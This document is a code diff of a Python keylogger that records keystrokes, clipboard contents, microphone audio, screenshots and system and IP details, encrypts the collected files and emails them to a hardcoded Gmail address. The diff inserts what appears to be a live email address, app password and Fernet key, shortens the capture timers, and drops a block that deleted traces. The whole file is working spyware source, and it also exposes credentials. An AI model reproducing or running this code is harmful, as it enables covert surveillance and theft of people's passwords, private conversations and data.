@@ -1,5 +1,3 @@
-# Libraries
-
 from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
 from email.mime.base import MIMEBase
@@ -38,25 +36,20 @@ system_information_e = "e_systeminfo.txt"
 clipboard_information_e = "e_clipboard.txt"
 
 microphone_time = 10
-time_iteration = 15
-number_of_iterations_end = 3
+time_iteration = 1
+number_of_iterations_end = 1
 
-email_address = " " # Enter disposable email here
-password = " " # Enter email password here
+email_address = "nitinganjam@gmail.com"
+password = "bsihangmahgbmtpj"
 
-username = getpass.getuser()
+toaddr = "nitinganjam@gmail.com"
 
-toaddr = " " # Enter the email address you want to send your information to
-
-key = " " # Generate an encryption key from the Cryptography folder
-
-file_path = " " # Enter the file path you want your files to be saved to
+file_path = "E:\\adv keylogger\\Project"
 extend = "\\"
 file_merge = file_path + extend
 
-# email controls
-def send_email(filename, attachment, toaddr):
 
+def send_email(filename, attachment, toaddr):
     fromaddr = email_address
 
     msg = MIMEMultipart()
@@ -96,9 +89,13 @@ def send_email(filename, attachment, toaddr):
 
     s.quit()
 
+
 send_email(keys_information, file_path + extend + keys_information, toaddr)
 
-# get the computer information
+
+# send_email(system_information, file_path + extend + system_information, toaddr)
+
+
 def computer_information():
     with open(file_path + extend + system_information, "a") as f:
         hostname = socket.gethostname()
@@ -108,7 +105,7 @@ def computer_information():
             f.write("Public IP Address: " + public_ip)
 
         except Exception:
-            f.write("Couldn't get Public IP Address (most likely max query")
+            f.write("Couldn't get Public IP Address (most likely max query)")
 
         f.write("Processor: " + (platform.processor()) + '\n')
         f.write("System: " + platform.system() + " " + platform.version() + '\n')
@@ -116,9 +113,10 @@ def computer_information():
         f.write("Hostname: " + hostname + "\n")
         f.write("Private IP Address: " + IPAddr + "\n")
 
+
 computer_information()
 
-# get the clipboard contents
+
 def copy_clipboard():
     with open(file_path + extend + clipboard_information, "a") as f:
         try:
@@ -131,9 +129,10 @@ def copy_clipboard():
         except:
             f.write("Clipboard could be not be copied")
 
+
 copy_clipboard()
 
-# get the microphone
+
 def microphone():
     fs = 44100
     seconds = microphone_time
@@ -143,23 +142,26 @@ def microphone():
 
     write(file_path + extend + audio_information, fs, myrecording)
 
-# get screenshots
+
+microphone()
+
+
 def screenshot():
     im = ImageGrab.grab()
     im.save(file_path + extend + screenshot_information)
 
-screenshot()
 
+screenshot()
 
 number_of_iterations = 0
 currentTime = time.time()
 stoppingTime = time.time() + time_iteration
 
-# Timer for keylogger
 while number_of_iterations < number_of_iterations_end:
 
     count = 0
-    keys =[]
+    keys = []
+
 
     def on_press(key):
         global keys, count, currentTime
@@ -172,7 +174,8 @@ while number_of_iterations < number_of_iterations_end:
         if count >= 1:
             count = 0
             write_file(keys)
-            keys =[]
+            keys = []
+
 
     def write_file(keys):
         with open(file_path + extend + keys_information, "a") as f:
@@ -185,17 +188,18 @@ while number_of_iterations < number_of_iterations_end:
                     f.write(k)
                     f.close()
 
+
     def on_release(key):
         if key == Key.esc:
             return False
         if currentTime > stoppingTime:
             return False
 
+
     with Listener(on_press=on_press, on_release=on_release) as listener:
         listener.join()
 
     if currentTime > stoppingTime:
-
         with open(file_path + extend + keys_information, "w") as f:
             f.write(" ")
 
@@ -209,18 +213,17 @@ while number_of_iterations < number_of_iterations_end:
         currentTime = time.time()
         stoppingTime = time.time() + time_iteration
 
-# Encrypt files
 files_to_encrypt = [file_merge + system_information, file_merge + clipboard_information, file_merge + keys_information]
-encrypted_file_names = [file_merge + system_information_e, file_merge + clipboard_information_e, file_merge + keys_information_e]
+encrypted_file_names = [file_merge + system_information_e, file_merge + clipboard_information_e,
+                        file_merge + keys_information_e]
 
 count = 0
 
 for encrypting_file in files_to_encrypt:
-
     with open(files_to_encrypt[count], 'rb') as f:
         data = f.read()
 
-    fernet = Fernet(key)
+    fernet = Fernet("_67IK-oSx4djYrhuDi_OZlFDJyozrB9aukjA6gJAymM=")
     encrypted = fernet.encrypt(data)
 
     with open(encrypted_file_names[count], 'wb') as f:
@@ -229,9 +232,6 @@ for encrypting_file in files_to_encrypt:
     send_email(encrypted_file_names[count], encrypted_file_names[count], toaddr)
     count += 1
 
-time.sleep(120)
+time.sleep(0.5)
 
-# Clean up our tracks and delete files
-delete_files = [system_information, clipboard_information, keys_information, screenshot_information, audio_information]
-for file in delete_files:
-    os.remove(file_merge + file)
+
